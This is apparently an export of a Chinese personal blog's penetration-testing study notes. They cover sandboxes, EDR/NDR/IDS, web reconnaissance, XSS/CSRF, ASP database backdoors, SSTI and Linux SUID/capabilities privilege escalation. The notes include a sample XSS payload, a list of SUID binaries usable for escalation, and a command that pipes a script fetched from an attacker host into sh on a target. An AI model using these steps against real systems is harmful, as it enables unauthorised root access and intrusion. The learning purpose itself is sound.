<h2 id="沙箱"><a href="#沙箱" class="headerlink" title="沙箱"></a>沙箱</h2><p>沙箱是指一种在安全测试和开发过程中使用的虚拟环境，可以模拟真实的操作系统和应用程序环境，以便进行安全测试、恶意软件分析、漏洞挖掘等操作，同时不会对真实环境造成影响。</p>
<p> 在沙箱中，可以运行不受信任的应用程序和代码，同时监控其行为和影响，以便及时发现和处理安全问题。沙箱通常具有隔离、快照、还原、调试等功能，可以帮助研究人员深入分析恶意代码的行为和特征，发现潜在的漏洞和安全风险。</p>
<p> 沙箱广泛应用于恶意软件分析、漏洞挖掘、网络安全测试、应用程序开发和测试等领域，可以帮助提高安全性和可靠性，减少安全风险和损失。</p>
<p><strong>沙箱</strong>就像网络世界的 <strong>“儿童沙盘游戏区”</strong>——在这个隔离的小空间里，程序可以随便“玩”（运行），但无论怎么折腾都 <strong>不会影响到外面的真实世界</strong>。简单来说，它是一个 <strong>安全的隔离环境</strong>，专门用来测试可疑文件、运行未知程序，或者处理敏感数据，既能满足功能需求，又能避免搞砸整个系统</p>
<h2 id="终端防护（EDR）"><a href="#终端防护（EDR）" class="headerlink" title="终端防护（EDR）"></a>终端防护（EDR）</h2><p>终端检测和响应 (EDR) 是一款软件，旨在自动保护组织的最终用户、终端设备和 IT 资产免受那些突破防病毒软件和其他传统终端安全工具安全防线的网络威胁。 EDR 将从网络上的所有终端（台式机和笔记本电脑、服务器、移动设备、IoT（物联网）设备等） 中连续收集数据。 它将实时分析这些数据以查找已知或疑似网络威胁的证据，并且可以自动作出响应以防止或尽可能减少所识别威胁造成的损失。</p>
<p>你电脑里有个文件突然开始疯狂删东西，传统杀毒软件可能不认识它，但EDR会立刻发现这文件“行为异常”，直接把它关进小黑屋，然后通知管理员：“抓到一个搞破坏的！”</p>
<h2 id="NDR"><a href="#NDR" class="headerlink" title="NDR"></a>NDR</h2><p><strong>NDR</strong>（网络威胁检测与响应）就像是<strong>网络的“智能监控系统”</strong>，专门盯着你家网络里的“车流”（数据流动），一旦发现可疑车辆（比如黑客攻击、病毒传播），它能立刻报警，甚至自动拦下这些危险分子。<br>NDR就像<strong>全网摄像头+自动警报器</strong>，保护客户数据不被黑客窃取</p>
<h2 id="IDS"><a href="#IDS" class="headerlink" title="IDS"></a>IDS</h2><p><strong>旁挂设备</strong><br><strong>在网络中部署IDS设备可以对整个网络系统进行实时监视</strong>，它抓取网络中指定的数据包，对其分析和统计，并能够展示全面的网络监控报表。对于分析发现的具有威胁的网络数据或者行为产生告警。IDS的使用给网络管理人员提供了非常好的辅助管理工具和运维依据。</p>
<p>常见厂商设备</p>
<h3 id="奇安信“天眼（NDR）”"><a href="#奇安信“天眼（NDR）”" class="headerlink" title="奇安信“天眼（NDR）”"></a>奇安信“天眼（<strong>NDR</strong>）”</h3><p>奇安信“天眼”是一款<strong>高级威胁检测与响应系统</strong>，主要用于监测和分析网络中的高级威胁（如APT攻击、勒索软件、木马等），通过流量分析、威胁情报匹配、攻击链还原等技术，实现<strong>全流程威胁感知与处置</strong>。其核心功能包括：</p>
<p><strong>APT攻击检测</strong>：通过流量镜像采集、文件虚拟执行（沙箱）、威胁情报匹配等技术，精准识别隐蔽性强的定向攻击</p>
<p><strong>网络流量深度解析</strong>：还原HTTP、SMTP等协议流量，提取网络层到应用层的日志数据，并加密传输至分析平台存储</p>
<p><strong>威胁情报整合</strong>：结合奇安信自有的海量威胁情报库（如恶意IP、域名、文件哈希值），实时匹配攻击行为</p>
<p><strong>攻击链可视化与溯源</strong>：基于ATT&amp;CK模型，将告警事件关联成攻击链，展示攻击路径、受感染资产及信息泄露情况，支持全包取证分析（类似Wireshark）</p>
<p><strong>自动化响应处置</strong>：与防火墙、终端EDR等设备联动，实现告警自动封堵、隔离受感染主机等操作</p>
<h4 id="系统组成"><a href="#系统组成" class="headerlink" title="系统组成"></a><strong>系统组成</strong></h4><p>天眼系统主要由以下模块构成：</p>
<p><strong>分析平台（硬件）</strong>：存储流量日志和告警数据，提供威胁分析、态势感知大屏展示，支持分布式存储和快速检索</p>
<p><strong>流量传感器（探针）</strong>：部署在网络镜像口，实时采集并解析流量，还原协议内容，生成日志和告警</p>
<p><strong>文件威胁鉴定器（沙箱）</strong>：对可疑文件（如邮件附件、下载文件）进行虚拟执行，检测恶意行为</p>
<p><strong>威胁情报（软件）</strong>：集成恶意样本特征、攻击者TTPs（战术、技术、过程）等数据，支撑威胁匹配</p>
]]></content>
      <categories>
        <category>hvv</category>
      </categories>
      <tags>
        <tag>hvv</tag>
      </tags>
  </entry>
  <entry>
    <title>跟着小迪的第三天</title>
    <url>/2025/03/08/%E8%B7%9F%E7%9D%80%E5%B0%8F%E8%BF%AA%E7%9A%84%E7%AC%AC%E4%B8%89%E5%A4%A9/</url>
    <content><![CDATA[<p>php开发</p>
<p>这个课听着无聊</p>
<?php

mysql_connect()//数据库连接

mysal_select_db()//选择库

?>

<p>文件上传功能</p>
<p>是自己写的还是应用的别人的框架</p>
<p>文件下载</p>
<p>直接下载 和传参下载</p>
<p>文件删除i基本上碰不到了</p>
<p>文件写入</p>
<p>web漏洞核心 可控变量和特定函数</p>
<p>输入输出类安全问题</p>
<p>xss漏洞</p>
<p>反射：存储：dom</p>
<p>输入的内容直接显示出来</p>
<p> 导致前端直接执行js代码</p>
<script>alert(1)</script>

<p>全局变量$_SERVER</p>
<p>数据包的所有请求头</p>
<p>csrf跨站点请求伪造</p>
<p> 后台管理系统有多个文件页面，为了方便验证，一般会选用cookie或session进行验证<br>cookie：身份验证存储到客户端浏览器内<br>session：身份验证存储到服务端服务器内</p>
<p>未授权访问</p>
<p>登录后的页面没有验证是否登录成功</p>
<p>验证方式cookie,session</p>
<p>cookie：身份验证存储到客户端浏览器内<br>cookie安全：cookie修改伪造盗取<br>session：身份验证存储到服务端服务器内<br>session安全：会话劫持（session劫持）</p>
<p>验证码复用</p>
<p>先输入正确密码然后抓包保存</p>
<p>这个验证码可以一直用</p>
<p>js前端验证 在浏览器上进行的验证 威胁：浏览器可以在前端直接忽略</p>
<p>框架</p>
]]></content>
      <tags>
        <tag>xiaodisec</tag>
      </tags>
  </entry>
  <entry>
    <title>提权</title>
    <url>/2024/11/14/%E6%8F%90%E6%9D%83/</url>
    <content><![CDATA[<h1 id="UGO"><a href="#UGO" class="headerlink" title="UGO"></a>UGO</h1><p>首先简单了解下UGO</p>
<p><strong>U</strong>（User）：文件主人（比如你创建的文件，你就是U）</p>
<p><strong>G</strong>（Group）：文件所属的“小团队”（比如财务部的文件，G就是财务组）</p>
<p><strong>O</strong>（Others）：既不是主人也不在团队里的其他人</p>
<ul>
<li>举个栗子🌰：你写了个工资表文件，U是你自己（能改），G是财务部（只能看），O是其他部门（完全没权限）</li>
</ul>
<h3 id="1、概述"><a href="#1、概述" class="headerlink" title="1、概述"></a>1、概述</h3><ul>
<li><p>文件权限设置：设置赋予某个用户或组能够以何种方式访问某个文件</p>
</li>
<li><p>权限对象：属主u、属组g、其他人o、所有人a(u+g+o)</p>
</li>
<li><p>权限类型：读（r&#x3D;4）、写（w&#x3D;2)、执行（x&#x3D;1)</p>
<p>所谓的ugo提权其实是修改其权限</p>
<p>例如用<code>chmod</code>命令（比如<code>chmod o+w 工资表.txt</code>就是让其他人也能修改这个文件）</p>
<p>那么当管理员有时候配置不当 将&#x2F;etc&#x2F;passwd 文件 权限改成o+r，那么我们作为普通用户的话就能够看到密码的哈希值，给普通用户的脚本加上<code>u+s</code>（SUID），运行时就变root权限</p>
<p>这种<strong>通过改UGO权限扩大访问范围</strong>的操作，才是“利用UGO机制提权”的本质</p>
</li>
</ul>
<h1 id="Linux-suid提权"><a href="#Linux-suid提权" class="headerlink" title="Linux suid提权"></a>Linux suid提权</h1><h2 id="什么是suid"><a href="#什么是suid" class="headerlink" title="什么是suid"></a>什么是suid</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">suid(set uid)是linux中的一种特殊权限，suid可以让调用者以文件拥有者身份运行该文件，所以利用suid提权的核心就是运行root用户所拥有的suid的文件，那么运行该文件的时候就得获得root用户的身份了。</span><br></pre></td></tr></table></figure>

<p>在Linux操作系统中，为了有效管理和维护用户及用户组的安全性和权限控制，系统引入了三个关键配置文件来存储相关信息：</p>
<ul>
<li><code>/etc/passwd</code>：此文件存储了系统中所有用户的基本信息，包括但不限于用户名、用户ID（UID）、默认组ID（GID）、用户描述、家目录路径以及登录Shell等。</li>
<li><code>/etc/shadow</code>：为了增强安全性，实际的用户密码哈希值被存储在这个文件中，而不是在 <code>/etc/passwd</code> 中公开可见。只有具有适当权限的进程才能读取此文件。</li>
<li><code>/etc/group</code>：该文件记录了系统中各个用户组的信息，包括组名、组密码（很少使用）、组ID（GID）以及属于该组的成员列表。</li>
</ul>
<p>每个文件系统中的文件都包含了与用户和组相关的元数据，这些信息定义了文件的所有权和访问权限。具体来说，每个文件的文件头（inode）中都会记录文件的所有者（用户）和所属组，以及相应的读、写、执行权限。</p>
<p>关于 <code>/etc/passwd</code> 文件的格式，每一行代表一个用户，由七个字段组成，各字段之间用冒号（:）分隔：</p>
<ol>
<li><strong>用户名</strong>（User Name）：这是用户登录系统时使用的名称。</li>
<li><strong>密码占位符</strong>（Password Placeholder）：早期版本的 Linux 系统中，这里会直接存储加密后的密码，但现在通常只是一个占位符（如 <code>x</code> 或 <code>*</code>），实际密码被安全地存储在 <code>/etc/shadow</code> 中。</li>
<li><strong>用户ID（UID）</strong>：每个用户在系统中都有一个唯一的数字标识符。</li>
<li><strong>主组ID（GID）</strong>：用户所属的主要用户组的ID。</li>
<li><strong>用户描述</strong>（User Description）：也称为 GECOS 字段，通常包含用户的全名、办公室号码、电话等信息。</li>
<li><strong>家目录</strong>（Home Directory）：用户登录后的工作目录路径。</li>
<li><strong>登录Shell</strong>（Login Shell）：用户登录时启动的命令解释器。例如，<code>/bin/bash</code> 表示使用 Bash shell，而 <code>/sbin/nologin</code> 则表示该账户不允许登录。</li>
</ol>
<p>通过这样的设计，Linux 系统能够实现细粒度的权限控制，确保系统的稳定性和安全性，同时也为管理员提供了强大的工具来管理用户和资源。</p>
<p>example:</p>
<p>root:x:0:0:root:&#x2F;root:&#x2F;usr&#x2F;bin&#x2F;zsh<br>daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin<br>bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</p>
<p>在Linux系统中，SUID（Set User ID）是一种特殊的文件权限位，允许普通用户在执行特定程序时临时获得该程序文件所有者的权限。这一机制在某些情况下非常有用，比如允许非特权用户执行需要更高权限的操作。然而，不当使用SUID权限可能会带来严重的安全风险，因此在系统管理和安全加固过程中需要特别谨慎。</p>
<h3 id="SUID权限详解"><a href="#SUID权限详解" class="headerlink" title="SUID权限详解"></a>SUID权限详解</h3><h4 id="定义与作用"><a href="#定义与作用" class="headerlink" title="定义与作用"></a>定义与作用</h4><p>SUID权限允许一个可执行文件在其运行期间，使执行该文件的进程拥有文件所有者的权限，而不是执行者的权限。这意味着，如果一个文件的所有者是 <code>root</code> 并且设置了SUID位，那么任何用户在执行该文件时，都将获得 <code>root</code> 用户的权限。</p>
<h4 id="实现方式"><a href="#实现方式" class="headerlink" title="实现方式"></a>实现方式</h4><p>在Linux中，可以通过以下命令设置SUID位：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> u+s /path/to/file</span><br></pre></td></tr></table></figure>

<p>这会在文件权限的用户执行位上添加一个 <code>s</code>，表示设置了SUID位。例如，一个文件的权限可能显示为 <code>-rwsr-xr-x</code>，其中 <code>s</code> 表示SUID位已设置。</p>
<h4 id="安全风险"><a href="#安全风险" class="headerlink" title="安全风险"></a>安全风险</h4><p>虽然SUID位在某些场景下非常有用，但它也带来了潜在的安全风险。如果一个文件设置了SUID位并且存在漏洞，攻击者可能会利用这些漏洞提升自己的权限。例如，如果一个普通用户的UID被修改为0（即 <code>root</code> 用户的UID），那么该用户登录系统时将自动获得 <code>root</code> 权限，这显然是非常危险的。</p>
<h1 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h1><p>在系统加固过程中，应采取以下措施来减少SUID带来的安全风险：</p>
<ol>
<li><p><strong>定期审计</strong>：</p>
<ul>
<li>使用 <code>find</code> 命令查找所有设置了SUID位的文件：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -4000 -<span class="built_in">type</span> f</span><br></pre></td></tr></table></figure></li>
<li>检查这些文件是否必要设置SUID位，如果不是，则移除SUID位：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> u-s /path/to/file</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>最小权限原则</strong>：</p>
<ul>
<li>确保只有必要的文件才设置SUID位，避免不必要的权限提升。</li>
<li>对于必须设置SUID位的文件，确保其代码经过严格的安全审查，没有已知漏洞。</li>
</ul>
</li>
<li><p><strong>用户管理</strong>：</p>
<ul>
<li>确保没有普通用户的UID被设置为0。可以通过以下命令检查：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">awk -F: <span class="string">&#x27;($3 == 0) &#123;print $1&#125;&#x27;</span> /etc/passwd</span><br></pre></td></tr></table></figure></li>
<li>如果发现有非 <code>root</code> 用户的UID为0，立即修改其UID。</li>
</ul>
</li>
<li><p><strong>日志监控</strong>：</p>
<ul>
<li>启用并配置系统日志，监控SUID文件的执行情况，及时发现异常行为。</li>
</ul>
</li>
</ol>
<p>通过上述措施，可以有效地管理和控制SUID权限，减少潜在的安全风险，确保系统的稳定性和安全性。</p>
<p>具有suid权限的二进制可执行文件有：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap vim find bash more less nano cp awk</span><br></pre></td></tr></table></figure>

<p>相关命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<ul>
<li><pre><code>**1. `find**`

`find` 是一个强大的命令行工具，用于在文件系统中搜索文件和目录。它可以根据各种条件（如文件名、大小、权限等）来查找文件。

2. `/`

`/` 表示从文件系统的根目录开始搜索。也就是说，`find` 会从系统的最顶层开始，递归地搜索所有子目录。

3. `-perm -u=s`

`-perm` 选项用于指定要查找的文件权限。这里的 `-u=s` 表示查找具有SUID权限的文件。

- `-u` 表示用户（user）权限。
- `=s` 表示SUID位已设置。

4. `-type f`

`-type` 选项用于指定要查找的文件类型。这里的 `f` 表示查找常规文件，而不是目录或其他特殊类型的文件。

- `f` 表示普通文件。
- 其他常见类型包括 `d`（目录）、`l`（符号链接）、`c`（字符设备）等。

5. `2&gt;/dev/null`

这部分用于处理命令执行过程中产生的错误信息。

- `2` 表示标准错误输出（stderr），它是进程的第二个文件描述符。
- `&gt;` 表示重定向操作符，用于将某个输出重定向到另一个地方。
- `/dev/null` 是一个特殊的文件，任何写入它的内容都会被丢弃。这里的作用是忽略 `find` 命令执行过程中产生的错误信息，使其不会显示在终端上。
</code></pre>
<p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/1731569964890.png"></p>
</li>
</ul>
<p>写的很详细<a href="https://www.cnblogs.com/kqdssheng/p/18286462#id1">https://www.cnblogs.com/kqdssheng/p/18286462#id1</a></p>
<h1 id="Linux提权之：利用capabilities提权"><a href="#Linux提权之：利用capabilities提权" class="headerlink" title="Linux提权之：利用capabilities提权"></a>Linux提权之：利用capabilities提权</h1><p>我们运行SUID的命令时，通常只是需要使用一小部分特权，但是使用SUID，却可以拥有root用户的全部权限。所以，一旦SUID的文件存在漏洞，便可能被利用，以root身份执行其他操作。</p>
<p>SUID的问题，主要在于权限控制太粗糙。为了对root身份进行更加精细的控制，Linux增加了另一种机制，即capabilities。</p>
<h2 id="Capabilities机制"><a href="#Capabilities机制" class="headerlink" title="Capabilities机制"></a>Capabilities机制</h2><p>Capabilities机制，是在Linux内核2.2之后引入的。它将root用户的权限细分为不同的领域，可以分别启用或禁用。从而，在实际进行特权操作时，如果euid不是root，便会检查是否具有该特权操作所对应的capabilities，并以此为依据，决定是否可以执行特权操作。</p>
<h4 id="什么是-Capabilities？"><a href="#什么是-Capabilities？" class="headerlink" title="什么是 Capabilities？"></a><strong>什么是 Capabilities？</strong></h4><h3 id="用大白话解释-Linux-的-Capabilities-提权"><a href="#用大白话解释-Linux-的-Capabilities-提权" class="headerlink" title="用大白话解释 Linux 的 Capabilities 提权"></a><strong>用大白话解释 Linux 的 Capabilities 提权</strong></h3><hr>
<h4 id="1-什么是-Capabilities？"><a href="#1-什么是-Capabilities？" class="headerlink" title="1. 什么是 Capabilities？"></a><strong>1. 什么是 Capabilities？</strong></h4><p>在 Linux 里，<strong>root 用户拥有所有权限</strong>，但有时候普通用户也需要完成某些高权限操作（比如修改密码或管理网络端口）。传统方法是给程序设置 SUID 权限（类似“万能钥匙”），但 SUID 会让程序拥有 root 的<strong>全部权限</strong>，风险极大</p>
<p>于是 Linux 引入了 <strong>Capabilities</strong> —— 把 root 的权限拆分成几十种“小权限”，比如</p>
<p>**<code>cap_setuid</code>**：允许修改用户身份（比如把自己变成 root）</p>
<p>**<code>cap_net_bind_service</code>**：允许绑定 1024 以下的端口（比如 80 端口）</p>
<p>**<code>cap_dac_override</code>**：无视文件权限限制，想读就读、想删就删</p>
<p>Capabilities 提权的核心是<strong>滥用管理员分配的小权限</strong>，组合成完整的 root 权限。就像小偷拿到“财务室门禁卡”后，再偷到老板的保险柜密码，最终搬空公司。防御的关键在于严格控制权限分配，定期清理“多余的钥匙</p>
<h1 id="手动枚举"><a href="#手动枚举" class="headerlink" title="手动枚举"></a>手动枚举</h1><h2 id="whoami"><a href="#whoami" class="headerlink" title="whoami"></a>whoami</h2><p>whoami算是很基础的但是这里还是列举一下其他相似的命令，便于获得更多的信息</p>
<p>id who w</p>
<p>last 显示系统近期登录的账户</p>
<p>uname -a 查看内核信息</p>
<p>lsb_release -a 更加详细的内核信息</p>
<p>cat &#x2F;proc&#x2F;version  也能够更加详细的得到内核信息</p>
<p>hostnamectl 也存在一些详细的信息</p>
<p>查看网络信息 </p>
<p>ip addr 查看当前机器的网卡</p>
<p>ip route 查看路由</p>
<p>ip neigh 查看邻居</p>
<p>arp -a 查看物理地址</p>
<p>sudo -l 查看哪些文件是可以以root的身份去执行的</p>
<p>getcap -r &#x2F; 2&gt;&#x2F;dev&#x2F;null 查看&#x2F;目录下哪些具有Capabilities的权限的能力</p>
<p>ls -a 将当前文件夹所有文件显示出来</p>
<p>ls -la 将文件所拥有的权限内容列举出来（包括-a隐藏文件）</p>
<p>history 列出历史记录</p>
<p>cat &#x2F;etc&#x2F;passwd 获取存取用户信息的文件</p>
<p>cat &#x2F;etc&#x2F;crontab 查看自动任务</p>
<p>查看环境变量 env  echo $path</p>
<p>ps -ef 查看进程</p>
<p>netstat -a 将所有网络信息列举出来</p>
<h1 id="自动化枚举工具"><a href="#自动化枚举工具" class="headerlink" title="自动化枚举工具"></a>自动化枚举工具</h1><p>linpeas</p>
<p>wget 进行下载 chomd 赋予权限 然后直接使用</p>
<p>那么如果目标靶机不出网 我们</p>
<p>将linpeas.sh攻击机启动一个http 服务</p>
<p>sudo python3 -m   http.server 80</p>
<p>然后靶机访问攻击机ip地址并且执行</p>
<p>curl xxxxxxx&#x2F;lenpeas.sh |sh</p>
]]></content>
      <categories>
        <category>提权</category>
      </categories>
      <tags>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>跟着小迪的第二天</title>
    <url>/2025/03/03/%E8%B7%9F%E7%9D%80%E5%B0%8F%E8%BF%AA%E7%9A%84%E7%AC%AC%E4%BA%8C%E5%A4%A9/</url>
    <content><![CDATA[<h1 id="信息打点"><a href="#信息打点" class="headerlink" title="信息打点"></a>信息打点</h1><p>1、打点-Web架构-语言&amp;中间件&amp;数据库&amp;系统等<br>2、打点-Web源码-CMS开源&amp;闭源售卖&amp;自主研发等<br>3、打点-Web源码获取-泄露安全&amp;资源监控&amp;其他等<br>4、打点-Web域名-子域名&amp;相似域名&amp;反查域名&amp;旁注等</p>
<p>区分windows 和Linux 可以用 大写小写来区分</p>
<p>windows上对文件的大小写不区分 </p>
<p>也可以通过ping网站来判断 一般 window de ttl&gt;100 Linux&lt;100</p>
<p>数据判断 搭建组合 端口扫描</p>
<p>#知识点：<br>1、CMS指纹识别源码获取方式<br>2、习惯&amp;配置&amp;特性等获取方式<br>3、托管资产平台资源搜索监控</p>
<p> 源码泄露</p>
<p>cms识别 云溪</p>
<p>管理员习惯不好 备份泄露</p>
<p>配置不当 git 泄露 |发布代码时候 没有将.git删除 直接同步上传道服务器其上</p>
<p> svn泄露 ds_Store泄露|同步发布道服务器上</p>
<p>php特性 composer.json 泄露 配置性说明性 文件 获得相关信息  </p>
<p>下载配合 WEB-INF泄露 必须要下载文件的漏洞 </p>
<p>GITHUB泄露 语法搜索&amp;管检测搜索</p>
<p>获取网络信息-服务厂商&amp;网络架构<br>获取服务信息-应用协议&amp;内网资产<br>获取阻碍信息-CDN&amp;WAF&amp;负载&amp;防火墙</p>
<p>内网资产查询  </p>
<p>旁注：同服务器下面的不同WEB应用查询技术<br>C段：同网段下面的不同服务器IP下的WEB应用查询技术</p>
<p>旁注查询 </p>
<p>c段查询 ip反查域名</p>
<p>cdn 查询 超级ping 去测试全国对其访问的速度来检测网站开通了cdn</p>
<p>网站waf  区分</p>
<p>超级ping：CDN服务识别<br>Masscan：端口扫描，应用协议<br>Wafw00f：Web应用防护防火墙识别<br>Nmap：端口扫描，应用协议，防火墙识别<br>lbd：负载均衡，广域网负载均衡，应用层负载均衡</p>
]]></content>
      <tags>
        <tag>dixodisec</tag>
      </tags>
  </entry>
  <entry>
    <title>跟着小迪的第四天</title>
    <url>/2025/03/09/%E8%B7%9F%E7%9D%80%E5%B0%8F%E8%BF%AA%E7%9A%84%E7%AC%AC%E5%9B%9B%E5%A4%A9/</url>
    <content><![CDATA[<p>ASP安全</p>
<p>遇到的比较少这里就不去复现了直接干看课程了</p>
<p>window asp iis access(sqlsever)</p>
<p>中间件问题 数据库问题 语言问题</p>
<p>aceess 数据库 一般后缀名 asp asa mdb(下载)</p>
<p>mdb默认下载</p>
<p>mdb文件在网站目录下</p>
<p>思路：知道数据库地址就可以尝试下载获取数据库文件 获取当前管理员账号信息</p>
<p>吧n</p>
<p>asp后门上传</p>
<p>ASP的数据库文件除了可以以mdb结尾，也能以asp结尾，由于mdb文件能下载而asp文件会被执行，因此当我们访问以asp结尾的数据库文件时只能看到乱码数据而不会自动下载，但依旧可以将乱码内容复制到记事本中，再将文件后缀修改成mdb，即可看到正常内容。</p>
<p>后门植入ASP的原理是当网站存在用户输入数据并被保存在数据库中时（例如留言信息），如果我们输入精心编写的ASP执行语句（类似一句话木马，但看起来是乱码的），然后服务器将其存储到数据库中，我们再访问这个asp数据库文件，由于服务器会把这个文件当成ASP解释执行，因此我们的执行语句也会被执行，这个时候再用菜刀等连接工具即可拿下服务器。<br> IIS 中间件解析漏洞</p>
<p>第一个就是文件夹有asp后缀 里面的文件全都按照asp进行解析</p>
<p>还有一种解析漏洞命名</p>
<p>IIS PUT上传漏洞，服务器开启写入功能才会有这个漏洞，不过比较少见</p>
<p>php 和java 没记录了 </p>
<p>直接记录python</p>
<p>ssti </p>
<p>模板 相当于手机主题差不都意思</p>
<p>字节码文件（bytecode），pyc文件经过python解释器<br>最终会生成机器码运行。因此pyc文件是可以跨平台部署的，类似Java的.class文件，<br>般py文件改变后，都会重新生成pyc文件。</p>
<p> 那么就可以反编译获得源码文件</p>
<pre><code>1、什么是sSTI？有什么漏洞危害？
</code></pre>
<p>漏洞成因就是服务端接收了用户的恶意输入以后，未经任何处理就将其作为We应用模<br>板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模<br>板的语句，因而可能导致了敏感信息泄露、代码执行、GetShe11等问题。其影响范围主<br>要取决于模版引擎的复杂性。</p>
]]></content>
      <tags>
        <tag>xiaodisec</tag>
      </tags>
  </entry>
  <entry>
    <title>跟着小迪第一天</title>
    <url>/2025/02/28/%E8%B7%9F%E7%9D%80%E5%B0%8F%E8%BF%AA%E7%AC%AC%E4%B8%80%E5%A4%A9/</url>
    <content><![CDATA[<p>跟着小迪学习第一天</p>
<p>名词解释</p>
<p>POC：全称’ProofofConcept’，中文’概念验证’，常指一段漏洞证明的代码。<br>EXP：全称’Exploit’，中文利用，指利用系统漏洞进行攻击的动作。<br>Payload：中文有效载荷，指成功exploit之后，真正在目标系统执行的代码或指令。<br>Shellcode：简单翻译’shell代码’，是Payload的一种，由于其建立正向&#x2F;反向shell而得名。</p>
<p>网站搭建前置知识</p>
<p>域名 子域名 DNS http&#x2F;https 证书</p>
<p>web应用框架架构 </p>
<p>理解不同web应用组成校色功能框架 </p>
<p>开发语言，程序源码，中间件容器，数据库类型，服务器操作系统，第三方软件等<br>开发语言：asp,php,aspx,jsp,java,python,ruby,go,html,javascript等<br>程序源码：根据开发语言分类；应用类型分类；开源CMS分类；开发框架分类等<br>中间件容器：IIS,Apache,Nginx,Tomcat,Weblogic,Jboos,glasshfish等|支撑网站运行，各有不同的功能<br>数据库类型: Access,Mysql,Mssql,Oracle,db2,Sybase,Redis,MongoDB等|存储数据，根据不同需求，应用不同的数据库类型<br>服务器操作系统：Windows系列，Linux系列，Mac系列等|<br>第三方软件：phpmyadmin,vs-ftpd,VNC,ELK,Openssh等 </p>
<p>#WEB应用安全漏洞分类（程序源码）<br>SQL注入，文件安全，RCE执行，XSS跨站，CSRF&#x2F;SSRF&#x2F;CRLF，<br>反序列化，逻辑越权，未授权访问，XXE&#x2F;XML，弱口令安全等</p>
<p>web请求的过程 <a href="https://www.cnblogs.com/51benpao/p/12984951.html">https://www.cnblogs.com/51benpao/p/12984951.html</a> </p>
<p>浏览器输入域名-&gt;浏览器dns解析到ip地址-&gt;服务器和客户机建立tcp(三次握手)连接-&gt;浏览器通过http协议发送请求数据包-&gt;可能某些服务会做重定向来负载均衡-&gt;浏览器跟踪重定向地址重新开始连接过程-&gt;服务器处理请求-&gt;服务器发出html响应-&gt;释放tcp连接-&gt;浏览器显示页面（此时还没有完全接受到html全部的文档）-&gt;发送剩余的内容</p>
<p>web请求数据包<a href="https://www.cnblogs.com/rayray/p/3729533.html">https://www.cnblogs.com/rayray/p/3729533.html</a></p>
<p>学会不同对象采用不同抓包封包抓取技术分析</p>
<p>基于网络接口抓包-网络接口<br>基于程序进程抓包-程序进程<br>基于数据协议抓包-HTTP&#x2F;S&amp;TCP&amp;UDP<br>基于应用对象抓包-APP&amp;小程序&amp;PCUI<br>基于系统使用抓包-模拟器&amp;WIN&amp;LINUX</p>
<p>存储密码加密-Web&amp;数据库&amp;系统<br>传输数据编码-各类组合传输参数值<br>代码特性加密-JS&amp;PHP&amp;NET&amp;JAVA<br>数据显示编码-字符串数据显示编码</p>
<p> 详细点：<br>密码存储加密：<br>MD5 SHA1 NTLM AES DES RC4<br>MD5值是32或16位位由数”0-9”和字母”a-f”所组成的字符串<br>SHA1这种加密的密文特征跟MD5差不多，只不过位数是40<br>NTLM这种加密是Windows的哈希密码，标准通讯安全协议<br>AES，DES，RC4这些都是非对称性加密算法，引I入密钥，密文特征与Base64类似<br>应用场景：各类应用密文，自定义算法，代码分析，CTF安全比赛等</p>
<p>NTLM介绍 <a href="https://blog.csdn.net/qq_62169455/article/details/132617592">https://blog.csdn.net/qq_62169455/article/details/132617592</a></p>
<p>后端代码加密：<br>PHP .NET JAVA<br>PHP：乱码，头部有信息<br>.NET：DLL封装代码文件<br>JAVA:JAR&amp;CLASS文件<br>举例：Zend ILSpy IDEA<br>应用场景：版权代码加密，开发特性，CTE比赛等</p>
<p>编译和反编译 <a href="https://zhuanlan.zhihu.com/p/4766970">https://zhuanlan.zhihu.com/p/4766970</a> <a href="https://blog.csdn.net/weixin_44943389/article/details/132507440">https://blog.csdn.net/weixin_44943389/article/details/132507440</a></p>
<p>#知识点：<br>1、资产架构-端口目录插件接口多站点多应用<br>2、番外安全-域名c服务器本身服务厂商管理人员<br>3、考虑阻碍-站库分离&amp;CDN&amp;WAF&amp;负载均衡&amp;主机防护<br>详细点：<br>1、前置条件-购买使用-云服务器域名等<br>2、架构搭建-目录c端口子域c插件s应用等<br>3、安全部署-WAE防火墙&amp;主机防护&amp;HIDS等<br>4、性能优化-负载均衡&amp;CDN加速cOSS云存储等</p>
<p><strong>资产架构</strong>：<br>WEB单个源码指向安全 |<br>WEB多个目录源码安全 |可能会有多个程序，就有多个漏洞 扫描软7bscan<br>WEB多个端口源码安全 | nmap<br>服务器架设多个站点安全|<br>架设第三方插件接口安全|<br>服务器架设多个应用安全|<br>#番外安全：<br>基于域名解析安全 |<br>基于服务器本身安全<br>基于服务商信息安全<br>基于管理个人的安全<br>#考虑阻碍：<br>阻碍-站库分离|<br>阻碍-CDN加速服务|<a href="https://zhuanlan.zhihu.com/p/616462418">https://zhuanlan.zhihu.com/p/616462418</a><br>阻碍-负载均衡服务|<a href="https://www.sangfor.com.cn/knowledge/load-balancing|%E5%8F%AF%E8%83%BD%E8%8E%B7%E5%BE%97%E7%9A%84%E6%98%AF%E5%A4%87%E7%94%A8%E6%9C%BA%E7%9A%84%E6%9D%83%E9%99%90">https://www.sangfor.com.cn/knowledge/load-balancing|可能获得的是备用机的权限</a><br>阻碍-WAF应用防火墙|</p>
<p>阻碍-主机防护防火墙|服务器杀毒软件</p>
]]></content>
      <tags>
        <tag>xiaodisec</tag>
      </tags>
  </entry>
</search>
